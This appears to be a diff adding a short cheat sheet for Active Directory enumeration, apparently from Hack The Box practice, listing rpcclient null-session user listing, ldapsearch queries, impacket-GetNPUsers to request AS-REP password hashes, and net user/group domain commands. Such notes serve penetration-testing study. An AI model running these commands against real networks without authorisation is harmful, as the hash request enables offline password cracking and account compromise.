@@ -1,0 +1,24 @@
+#Enumerate users from 135, 389 ports
+rpcclient -U '' -N <IP>
+rpcclient-> enumdomusers
+
+ldapsearch -H ldap://<IP> -x -s base namingcontext
+ldapsearch -H ldap://<IP> -x -b"DC=htb,DC=local"
+ldapsearch -H ldap://<IP> -x -b"DC=htb,DC=local" '(objectClass=User)' "sAMAccountName" | grep "sAMAccountName"
+
+
+# Trying to pull down the password hash if any
+impacket-GetNPUsers -dc-ip <DOMAIN_CONTROLLER_IP> -request 'htb.local/'
+
+# When we have access to a user shell
+#Print out users in the domain
+net user /domain
+
+#Checking specific user on domain
+net user jeffadmin /domain
+
+#Enumerate groups on the domain
+net group /domain
+
+#Enumerate group members
+net group "Sales Department" /domain
